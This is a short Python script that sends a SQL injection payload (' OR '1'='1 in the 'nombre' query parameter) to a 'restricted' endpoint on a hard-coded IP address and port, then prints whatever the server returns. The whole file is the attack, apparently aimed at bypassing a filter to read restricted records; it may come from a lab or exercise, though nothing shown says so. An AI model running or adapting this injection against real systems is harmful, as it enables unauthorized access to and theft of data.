import urllib.request
import urllib.parse

ruta = "http://34.174.215.121:8001/country/restricted"

parametro = urllib.parse.urlencode({"nombre": "' OR '1'='1"})
url = f"{ruta}?{parametro}"

print(url)
with urllib.request.urlopen(url) as request:
    print(request.read())
